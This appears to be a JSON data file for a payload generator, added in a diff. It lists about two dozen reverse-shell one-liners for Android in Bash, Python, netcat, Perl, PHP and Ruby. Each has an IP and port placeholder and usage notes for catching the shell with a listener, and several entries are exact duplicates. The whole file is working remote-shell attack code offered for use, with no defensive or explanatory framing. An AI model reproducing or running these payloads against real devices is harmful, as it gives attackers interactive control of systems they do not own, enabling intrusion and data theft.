@@ -1,0 +1,297 @@
+{
+    "payloads": [
+        {
+            "os": "Android",
+            "language": "Bash",
+            "description": "Simple Bash reverse shell using /dev/tcp.",
+            "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+            "usage": "Run in Android terminal emulator. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "one-liner",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Python",
+            "description": "Python reverse shell using socket and subprocess modules.",
+            "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/system/bin/sh\",\"-i\"])'",
+            "usage": "Requires Python3 installed (via Termux). Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Netcat",
+            "description": "Netcat reverse shell using /system/bin/sh.",
+            "template": "nc {ip} {port} -e /system/bin/sh",
+            "usage": "Run in Android with netcat supporting -e. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "netcat",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Perl",
+            "description": "Perl reverse shell using socket and exec.",
+            "template": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/system/bin/sh -i\");};'",
+            "usage": "Requires Perl installed (via Termux). Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "perl",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "PHP",
+            "description": "PHP reverse shell using fsockopen and exec.",
+            "template": "<?php $sock=fsockopen('{ip}',{port});exec('/system/bin/sh -i <&3 >&3 2>&3'); ?>",
+            "usage": "Run in PHP environment on Android server. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "php",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Ruby",
+            "description": "Ruby reverse shell using socket and exec.",
+            "template": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/system/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "usage": "Requires Ruby installed (via Termux). Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "ruby",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Bash",
+            "description": "Bash reverse shell with TCP socket and /system/bin/sh.",
+            "template": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; /system/bin/sh <&196 >&196 2>&196",
+            "usage": "Run in Android terminal emulator. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Python",
+            "description": "Python reverse shell with socket and pty for TTY allocation.",
+            "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/system/bin/sh\")'",
+            "usage": "Requires Python3 installed (via Termux). Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "pty",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Bash",
+            "description": "Bash reverse shell with exec and TCP socket.",
+            "template": "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
+            "usage": "Run in Android terminal emulator. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "PHP",
+            "description": "PHP reverse shell using proc_open for bidirectional shell.",
+            "template": "<?php $process=proc_open('/system/bin/sh', array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w')), $pipes); $sock=fsockopen('{ip}',{port}); while(!feof($sock)) { fwrite($pipes[0], fread($sock,1024)); fwrite($sock, fread($pipes[1],1024)); } fclose($sock); proc_close($process); ?>",
+            "usage": "Run in PHP environment. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "php",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Python",
+            "description": "Python reverse shell with socket and subprocess.",
+            "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/system/bin/sh\",\"-i\"])'",
+            "usage": "Requires Python3 installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Bash",
+            "description": "Bash reverse shell with mkfifo and /system/bin/sh.",
+            "template": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /system/bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f",
+            "usage": "Run in Android terminal emulator. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "fifo",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Netcat",
+            "description": "Netcat reverse shell without -e support using mkfifo.",
+            "template": "rm /data/local/tmp/f; mkfifo /data/local/tmp/f; cat /data/local/tmp/f | /system/bin/sh -i 2>&1 | nc {ip} {port} > /data/local/tmp/f",
+            "usage": "Works on Android with netcat without -e. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "netcat",
+                "fifo",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Bash",
+            "description": "Bash reverse shell using TCP socket with file descriptor 5.",
+            "template": "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
+            "usage": "Run in Android shell. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Python",
+            "description": "Python reverse shell with socket, subprocess, and select for multiple commands.",
+            "template": "python3 -c 'import socket,subprocess,select;s=socket.socket();s.connect((\"{ip}\",{port}));while True:r,w,e=select.select([s],[],[]);if s in r:data=s.recv(1024).decode();proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);out=proc.stdout.read()+proc.stderr.read();s.send(out)'",
+            "usage": "Requires Python3 installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "PHP",
+            "description": "PHP reverse shell using shell_exec and fsockopen.",
+            "template": "<?php $sock=fsockopen('{ip}',{port});while($cmd=fgets($sock)){echo shell_exec($cmd);}?>",
+            "usage": "Run in PHP environment. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "php",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Ruby",
+            "description": "Ruby reverse shell with socket and exec.",
+            "template": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/system/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+            "usage": "Requires Ruby installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "ruby",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Perl",
+            "description": "Perl reverse shell with socket and exec.",
+            "template": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/system/bin/sh -i\");};'",
+            "usage": "Requires Perl installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "perl",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Bash",
+            "description": "Bash reverse shell using TCP socket and /system/bin/sh.",
+            "template": "bash -c 'exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done'",
+            "usage": "Run in Android shell. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Python",
+            "description": "Python reverse shell with socket and subprocess, spawning a shell.",
+            "template": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/system/bin/sh\",\"-i\"])'",
+            "usage": "Requires Python3 installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "python",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "PHP",
+            "description": "PHP reverse shell with proc_open.",
+            "template": "<?php $process=proc_open('/system/bin/sh', array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w')), $pipes); $sock=fsockopen('{ip}',{port}); while(!feof($sock)) { fwrite($pipes[0], fread($sock,1024)); fwrite($sock, fread($pipes[1],1024)); } fclose($sock); proc_close($process); ?>",
+            "usage": "Run in PHP environment. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "php",
+                "interactive",
+                "fileless"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Ruby",
+            "description": "Ruby reverse shell with socket and exec.",
+            "template": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",{port});loop{cmd=c.gets;break if cmd.nil?;IO.popen(cmd,\"r\"){|io|c.print io.read}}'",
+            "usage": "Requires Ruby installed. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "ruby",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Netcat",
+            "description": "Netcat reverse shell using -c option.",
+            "template": "nc -c /system/bin/sh {ip} {port}",
+            "usage": "Run on Android with netcat supporting -c. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "netcat",
+                "interactive"
+            ]
+        },
+        {
+            "os": "Android",
+            "language": "Bash",
+            "description": "Bash reverse shell using /dev/tcp with file descriptor 5.",
+            "template": "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
+            "usage": "Run on Android terminal. Listener: netcat or TCP listener.",
+            "tags": [
+                "reverse_tcp",
+                "bash",
+                "interactive"
+            ]
+        }
+    ]
+}
